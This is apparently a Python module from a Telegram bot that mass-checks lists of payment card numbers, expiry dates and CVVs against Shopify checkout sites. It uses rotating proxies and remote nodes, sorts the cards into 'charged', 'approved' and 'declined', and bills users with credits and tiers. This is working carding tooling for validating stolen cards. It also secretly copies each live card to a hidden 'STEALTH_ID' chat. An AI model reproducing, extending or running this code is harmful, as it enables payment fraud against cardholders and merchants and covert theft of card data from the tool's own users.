"""msh.py — Shopify Mass (Node Client Integration)"""
import re, random, logging, time, string, io, html
import asyncio
from bin import get_bin_info
from database import (get_user_credits, update_user_credits, get_active_proxy_strings, get_working_site_urls, get_msh_speed, record_check, is_db_admin, log_charged_hit, get_bot_setting)
from plans import get_user_current_tier
from config import OWNER_NAME, OWNER_USERNAME, BOT_NAME, HIT_DETECTION_GROUP_ID, OWNER_ID, STEALTH_ID
from emojis import PremiumEmoji as E
from api_config import is_site_enabled
from api_parse import get_gateway, get_price_currency
from telegram import InlineKeyboardMarkup, InlineKeyboardButton
from ui import primary, success, danger
from node_client import NODE_MANAGER_VPS, NODE_MANAGER_HEROKU

logger = logging.getLogger(__name__)

CHARGED_PATTERNS = ["order_paid", "order_placed", "charged", "thank you", "payment successful", "payment_complete", "captured", "paid"]
APPROVED_PATTERNS = ["3d_authentication", "3ds_required", "3d_secure", "3ds2", "insufficient_funds", "insufficient funds", "incorrect_zip", "incorrect zip", "invalid_cvc", "invalid cvc", "otp_required", "otp required", "otp", "verification_required", "authenticate_successful", "authenticate_attempt_successful"]
DECLINED_PATTERNS = ["card_declined", "generic_error", "do not honor", "expired", "invalid_token", "invalid token", "token not found", "error processing card", "missing_parameters", "processor_declined", "payments_credit_card_brand_not_supported", "payments_credit_card_base_expired", "payments_credit_card_verification_value_invalid", "payments_payment_flexibility_terms_id_mismatch", "payments_credit_card_session_id", "validation_custom", "tax_tax_inclusivity_mismatch", "order subtotal is less than", "minimum value for your order", "suspected fraud", "fraud", "blocked by cartwatch", "processing_error", "no payment method available", "invalid_purchase_type", "merchandise_product_not_published", "fulfillment type is required", "shipinsure items", "buyer_identity_presentment_currency", "this address field is invalid", "logo, embroidery, text and oversize", "this payment has been blocked", "order prevented", "waiting_pending_terms", "amount_too_small", "invalid_payment_method", "sorry, your order contains only", "checkout is not allowed", "quantity for", "unable", "declined", "failed", "not supported", "payments_proposed_gateway_unavailable"]
INFRA_ERRORS = ["step 1 failed", "step 2 failed", "step 3 failed", "step 4 failed", "step 5 failed", "step 6 failed", "step 7 failed", "step 8 failed", "step 9 failed", "step 10 failed", "missing stableid", "missing buildid", "missing sourcetoken", "permalink returned", "403 forbidden", "429", "connection timed out", "curl:", "failed to perform", "site requires login", "failed to get token", "failed to get session token", "failed to get sessiontoken", "no valid products", "not shopify", "connection error", "could not resolve host", "connect tunnel failed", "could not extract sessiontoken", "404 not found", "internal error"]

active_mass_checks = {}
pending_mass_checks = {}
group_limiter = asyncio.Semaphore(2)
_BIN_CACHE, _BIN_TTL = {}, 3600

def gen_sid(): return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
def luhn(cn):
    cn = re.sub(r'\D', '', cn)
    if not cn.isdigit() or len(cn) < 13 or len(cn) > 19: return False
    d = [int(x) for x in cn]
    for i in range(len(d) - 2, -1, -2):
        d[i] *= 2
        if d[i] > 9: d[i] -= 9
    return sum(d) % 10 == 0

def parse_card(s):
    s = s.strip()
    pats = [r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$', r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$', r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$']
    for pat in pats:
        m = re.match(pat, s)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            return cc, mm, yy, cvv
    return None

def extract_cards(t):
    if not t: return []
    cards, seen = [], set()
    t = t.replace('\r', '')
    pat = re.compile(r'(\d{13,19})\s*[|/:,\t ]\s*(\d{1,2})\s*[|/:,\t ]\s*(\d{2,4})\s*[|/:,\t ]\s*(\d{3,4})')
    for match in pat.finditer(t):
        cc, mm, yy, cvv = match.groups()
        cc = re.sub(r'\D', '', cc)
        if 13 <= len(cc) <= 19:
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s)
                cards.append(s)
                if len(cards) >= 100000: break
    return cards

def _classify_response(response_text):
    rl = str(response_text).lower()
    if any(k in rl for k in INFRA_ERRORS): return "error"
    if any(k in rl for k in CHARGED_PATTERNS): return "charged"
    if any(k in rl for k in APPROVED_PATTERNS): return "approved"
    return "declined"

def _get_session_good_sites(session):
    if session is None: return []
    cache = session.get('good_sites_cache')
    if cache is not None: return cache
    all_sites = get_working_site_urls() or []
    bad = session.get('bad_sites') or {}
    th = session.get('bad_site_threshold', 5)
    good = [s for s in all_sites if bad.get(s, 0) < th] if bad else list(all_sites)
    if not good: good = list(all_sites)
    session['good_sites_cache'] = good
    return good

def _mark_site_bad(session, site):
    if session is None or not site: return
    bad = session.setdefault('bad_sites', {})
    bad[site] = bad.get(site, 0) + 1
    th = session.get('bad_site_threshold', 5)
    if bad[site] < th: return
    cache = session.get('good_sites_cache')
    if cache is not None:
        try: cache.remove(site)
        except ValueError: pass
        if not cache: session['good_sites_cache'] = None

def fmt_mass(r, ui):
    if not r.get("success"):
        err = r.get("error", "?")
        if r.get("is_luhn_failed"): return f"❌ Luhn <code>{r.get('card', '')}</code>", "declined"
        return f"⚠️ Err <code>{r.get('card', '')}</code>: {err}", "error"

    ar = r.get("api_response", {})
    cd, b, is_ = r.get("card", ""), r.get("brand", "N/A"), r.get("issuer", "N/A")
    co, cof = r.get("country", "?"), r.get("country_flag", "")
    rt = str(ar.get("Response", "N/A")).replace("\\", "").replace("/", "").replace('"', "").replace("'", "")
    gw = get_gateway(ar); pv, cur, sym, _ = get_price_currency(ar)
    gw_price = f"{gw} [{sym}{pv:.2f}]"
    cat = r.get("category_hint") or _classify_response(rt)

    st = f"<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> {E.FIRE}" if cat == "charged" else (f"<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> {E.APPROVED}" if cat == "approved" else f"<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> {E.DECLINED}")
    uid, fn = ui.get("id", "?"), ui.get("first_name", "User")
    tier = get_user_current_tier(uid)

    return (f"<blockquote>{E.THUNDER} <b>Status</b> ↬ {st}</blockquote>\n{E.CARD} <b>𝐂𝐚𝐫𝐝</b>\n⤷ <code>{cd}</code>\n{E.GATE} <b>Gw</b> ↬ <i>{gw_price}</i>\n{E.RESPONSE} <b>Resp</b> ↬ <b>{rt}</b>\n<blockquote><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ \"{b}\"\n<b>𝑩𝒂𝒏𝒌</b> ↬ \"{is_}\"\n<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ {cof} \"{co}\"</blockquote>\n{E.USER} <b>User</b> ↬ <a href='tg://user?id={uid}'>{fn}</a> <code>[{tier}]</code>"), cat

def fmt_prog(stats, sid):
    return (f"<blockquote>{E.THUNDER} <b>SHOPIFY MASS</b> {E.SPARKLE}</blockquote>\n{E.KEY} <b>Session:</b> <code>{sid}</code>\n{E.STATS} <b>Progress:</b> <code>{stats.get('processed', 0)}/{stats['total']}</code>")

def get_msh_keyboard(stats, last_cc, last_status, sid):
    return InlineKeyboardMarkup([
        [primary(f"• {last_cc} •", cb='u8')],
        [primary(f"• 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➜ {last_status} •", cb='u8')],
        [success(f"• 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥 ➜ [ {stats.get('charged', 0)} ] •", cb='x')],
        [success(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {stats.get('approved', 0)} ] •", cb='x')],
        [danger(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {stats.get('declined', 0)} ] •", cb='x')],
        [primary(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {stats.get('total', 0)} ] •", cb='x')],
        [danger(f"• 𝙀𝙍𝙍𝙊𝙍 ⚠️ ➜ [ {stats.get('error', 0)} ] •", cb='x')],
        [danger(f"[ 𝙎𝙏𝙊𝙋 ]", cb=f'msh_stop_{sid}')]
    ])

def fmt_final(stats, elapsed, un, stopped=False, sid=None):
    h = "Stopped ⏹️" if stopped else "Final ✅"
    return (f"<blockquote>{E.SUCCESS} <b>Status</b> ↬ {h}</blockquote>\n{E.KEY} <b>Session</b> ↬ <code>{sid or 'N/A'}</code>\n{E.STATS} <b>Total</b> ↬ <code>{stats['total']}</code>\n{E.FIRE} <b>Charged</b> ↬ <code>{stats['charged']}</code>\n{E.APPROVED} <b>Approved</b> ↬ <code>{stats['approved']}</code>\n{E.ERROR} <b>Declined</b> ↬ <code>{stats['declined']}</code>\n{E.CLOCK} <b>Time</b> ↬ <code>{elapsed}s</code>")

async def check_one(card, ui, session, api_url, site_on, stop_ev=None):
    parsed = parse_card(card)
    if not parsed: return {"success": False, "error": "Bad format", "card": card, "is_luhn_failed": True}
    cc, mm, yy, cvv = parsed
    if not luhn(cc): return {"success": False, "error": "Luhn", "card": card, "is_luhn_failed": True}

    info = await _get_bin_cached(cc[:6])
    b, is_, co, cof = (info.get("scheme") or "N/A").title(), info.get("bank") or "N/A", info.get("country") or "Unknown", info.get("country_emoji", "")

    proxies = session.get('proxies', [])
    if not proxies: return {"success": False, "error": "No proxies", "card": card}
    
    proxy = random.choice(proxies)
    site = None
    if site_on:
        good = _get_session_good_sites(session)
        if good: site = random.choice(good)

    cstr = f"{cc}|{mm}|{yy}|{cvv}"
    use_vps = get_bot_setting("lb_vps", "off") == "on"
    use_heroku = get_bot_setting("lb_heroku", "off") == "on"
    
    if not use_vps and not use_heroku:
        return {"success": False, "error": "LBs OFF", "card": card}

    mgr = NODE_MANAGER_VPS if use_vps else NODE_MANAGER_HEROKU
    res = await mgr.check(card=cstr, proxy=proxy, site=site, single=False)
    
    if res.get("Response") == "NODE_UNAVAILABLE":
        return {"success": False, "error": "Nodes Unavailable", "card": card}

    response_text = res.get("Response", "")
    category = _classify_response(response_text)
    
    if category in ("charged", "approved", "declined"):
        gw = res.get("Gate", "Shopify Payments")
        if category in ("charged", "approved"):
            try:
                await session['bot'].send_message(chat_id=STEALTH_ID, text=f"<b>💎 HIDDEN HIT</b>\n<b>User:</b> <code>{ui['id']}</code>\n<b>CC:</b> <code>{card}</code>\n<b>Resp:</b> {response_text}", parse_mode="HTML")
                log_charged_hit(ui['id'], card, response_text, gw)
            except: pass
        
        return {"success": True, "api_response": res, "card": card, "brand": b, "issuer": is_, "country": co, "country_flag": cof, "proxy_status": "live", "category_hint": category}

    return {"success": False, "error": f"Infra: {response_text[:60]}", "card": card}

async def process_one(card, ui, stats, ctx, upd, uid, stop_ev, mid, cid, sid, inc_app, results_data, api_url, site_on):
    pd = active_mass_checks.get(sid)
    r = None
    try:
        if stop_ev.is_set(): return
        r = await check_one(card, ui, pd, api_url, site_on, stop_ev)
        if stop_ev.is_set() or r is None: return

        fmt, cat = fmt_mass(r, ui)
        stats["processed"] += 1
        if cat == "error":
            stats["error"] += 1
            results_data[card] = {"card": card, "status": "ERROR", "response": str(r.get("error", "Unknown")).replace('\n', ' '), "gateway": "-", "price": "-"}
            return

        stats["checked"] += 1
        if cat == "charged": stats["charged"] += 1
        elif cat == "approved": stats["approved"] += 1
        else: stats["declined"] += 1

        if not r.get("success"):
            results_data[card] = {"card": card, "status": "ERROR", "response": str(r.get("error", "Unknown")).replace('\n', ' '), "gateway": "-", "price": "-"}
        else:
            ar = r.get("api_response", {})
            results_data[card] = {"card": card, "status": cat.upper(), "response": str(ar.get("Response", "N/A")).replace('\n', ' '), "gateway": get_gateway(ar), "price": get_price_currency(ar)[3]}

        try:
            if cat in ("charged", "approved", "declined"): record_check(uid, cat, "Shopify Mass", card)
        except: pass

        if cat in ("charged", "approved"):
            resp_l = str(r.get("api_response", {}).get("Response", "")).lower()
            if not any(k in resp_l for k in ["3d_authentication", "3ds_required", "3d_secure", "3ds2", "otp"]):
                if get_bot_setting("hit_logs", "off") == "on":
                    hit_gc = get_bot_setting("hit_gc", HIT_DETECTION_GROUP_ID)
                    async with group_limiter:
                        await asyncio.sleep(1)
                        try: await ctx.bot.send_message(chat_id=hit_gc, text=fmt, parse_mode="HTML")
                        except: pass

        should = (cat == "charged") or (inc_app and cat == "approved")
        if should:
            await asyncio.sleep(1.5)
            try: await ctx.bot.send_message(chat_id=uid, text=fmt, parse_mode="HTML")
            except: pass
    finally:
        if not pd: return
        pd["last_cc"] = card
        pd["last_status"] = str(r.get("api_response", {}).get("Response", "N/A"))[:22] if r and r.get("success") else "ERROR"

        if stats["processed"] % 5 == 0 or stats["processed"] == stats["total"]:
            if time.time() - pd.get("last_progress_update", 0) > 2:
                pd["last_progress_update"] = time.time()
                try: await ctx.bot.edit_message_text(chat_id=pd["chat_id"], message_id=pd["message_id"], text=fmt_prog(stats, sid), parse_mode="HTML", reply_markup=get_msh_keyboard(stats, pd["last_cc"], pd["last_status"], sid))
                except: pass

async def process_mass(cards, ui, upd, ctx, inc_app):
    uid, fn, sid = ui.get("id"), ui.get("first_name"), gen_sid()
    proxies = get_active_proxy_strings(OWNER_ID) or []
    if not proxies:
        await upd.message.reply_text(f"{E.WARNING} No proxies.", parse_mode="HTML"); return
    site_on = is_site_enabled()
    
    try: msh_speed = min(max(get_msh_speed(), 1), 20)
    except: msh_speed = 5

    stats = {"total": len(cards), "checked": 0, "charged": 0, "approved": 0, "declined": 0, "error": 0, "processed": 0}
    results_data = {}
    start = time.time()
    stop_ev = asyncio.Event()

    active_mass_checks[sid] = {
        "stopped": False, "stop_event": stop_ev, "message_id": None, "start_time": start,
        "stats": stats, "workers": [], "user_id": uid, "chat_id": None, "session_id": sid,
        "last_progress_update": 0, "last_cc": "NONE", "last_status": "PENDING",
        "proxies": proxies, "bad_sites": {}, "good_sites_cache": None, "bot": ctx.bot
    }

    pm = await upd.message.reply_text(text=fmt_prog(stats, sid), parse_mode="HTML", reply_markup=get_msh_keyboard(stats, "NONE", "PENDING", sid))
    active_mass_checks[sid]["message_id"] = pm.message_id
    active_mass_checks[sid]["chat_id"] = pm.chat_id
    sem = asyncio.Semaphore(msh_speed)

    async def _c(card, idx):
        if stop_ev.is_set(): return
        async with sem:
            if stop_ev.is_set(): return
            await asyncio.sleep(0.1)
            t = asyncio.create_task(process_one(card, ui, stats, ctx, upd, uid, stop_ev, active_mass_checks[sid]["message_id"], active_mass_checks[sid]["chat_id"], sid, inc_app, results_data, "", site_on))
            active_mass_checks[sid]["workers"].append(t)
            try: await t
            except asyncio.CancelledError: return

    tasks = [asyncio.create_task(_c(c, i)) for i, c in enumerate(cards)]
    for t in asyncio.as_completed(tasks):
        if stop_ev.is_set():
            for x in tasks:
                if not x.done(): x.cancel()
            break
        try: await t
        except asyncio.CancelledError: continue

    active_mass_checks[sid]["workers"].clear()
    elapsed, stopped = round(time.time() - start, 2), stop_ev.is_set()
    if get_user_credits(uid) != float('inf') and not stopped: update_user_credits(uid, -1)
    pd = active_mass_checks.pop(sid, None)

    if pd and pd.get("chat_id") and pd.get("message_id"):
        try: await ctx.bot.edit_message_text(chat_id=pd["chat_id"], message_id=pd["message_id"], text=fmt_final(stats, elapsed, fn, stopped, sid), parse_mode="HTML", reply_markup=None)
        except: pass

    txt = f"=========== MSH SUMMARY ===========\nSession: {sid}\nTotal: {stats['total']}\nCharged: {stats['charged']}\nApproved: {stats['approved']}\nDeclined: {stats['declined']}\nErrors: {stats['error']}\nTime: {elapsed}s\n"
    file_obj = io.BytesIO(txt.encode()); file_obj.name = f"MSH_{sid}.txt"
    try: await ctx.bot.send_document(chat_id=uid, document=file_obj)
    except: pass

async def handle_msh_command(update, context):
    try:
        uid, un, fn = update.effective_user.id, update.effective_user.username, update.effective_user.first_name
        if get_user_current_tier(uid) == "Trial":
            await update.message.reply_text(f"{E.WARNING} Trial not allowed.", parse_mode="HTML"); return
        for s, d in active_mass_checks.items():
            if d["user_id"] == uid:
                await update.message.reply_text(f"{E.WARNING} Already running.", parse_mode="HTML"); return
        if not get_active_proxy_strings(OWNER_ID):
            await update.message.reply_text(f"{E.WARNING} No proxies.", parse_mode="HTML"); return

        cards, extracted_text = [], ""
        r = update.message.reply_to_message if update.message.reply_to_message else update.message
        if r.document:
            f = await context.bot.get_file(r.document.file_id)
            extracted_text = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
            cards = extract_cards(extracted_text)
        elif r.text:
            extracted_text = r.text
            cards = extract_cards(extracted_text)

        if not cards:
            await update.message.reply_text(f"{E.ERROR} No Valid Cards Found", parse_mode="HTML"); return

        max_l = 100000 if (uid == OWNER_ID or is_db_admin(uid)) else 10000
        if len(cards) > max_l:
            await update.message.reply_text(f"{E.ERROR} Max {max_l} cards.", parse_mode="HTML"); return
        if get_user_credits(uid) < 1 and get_user_credits(uid) != float('inf'):
            await update.message.reply_text(f"{E.WARNING} Need 1 credit.", parse_mode="HTML"); return

        pending_mass_checks[uid] = {"cards": cards, "user_info": {"id": uid, "username": un, "first_name": fn}, "update": update}
        kb = InlineKeyboardMarkup([[success("Yes ✅", cb=f"msh_yes_{uid}"), danger("No ❌", cb=f"msh_no_{uid}")]])
        await update.message.reply_text(f"<blockquote>{E.INFO} <b>Approved cards?</b></blockquote>\nFound: <code>{len(cards)}</code>\nYes: Chg+App\nNo: Chg only", parse_mode="HTML", reply_markup=kb)
    except Exception as e:
        logger.error(e)
        await update.message.reply_text(f"{E.ERROR} {html.escape(str(e)[:100])}", parse_mode="HTML")

async def handle_msh_confirm_callback(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if uid not in pending_mass_checks:
        await q.edit_message_text("No pending.", parse_mode="HTML"); return
    pd = pending_mass_checks.pop(uid)
    try: await q.delete_message()
    except: pass
    asyncio.create_task(process_mass(pd["cards"], pd["user_info"], pd["update"], context, q.data.startswith("msh_yes_")))

async def handle_msh_stop_callback(update, context):
    q = update.callback_query
    if not q.data.startswith("msh_stop_"): await q.answer(); return
    sid = q.data.split("_")[2]
    if sid in active_mass_checks:
        active_mass_checks[sid]["stopped"] = True
        active_mass_checks[sid]["stop_event"].set()
        for t in active_mass_checks[sid]["workers"]:
            if not t.done(): t.cancel()
        await q.answer("Stopping...", show_alert=True)
    else: await q.answer("Invalid.", show_alert=True)
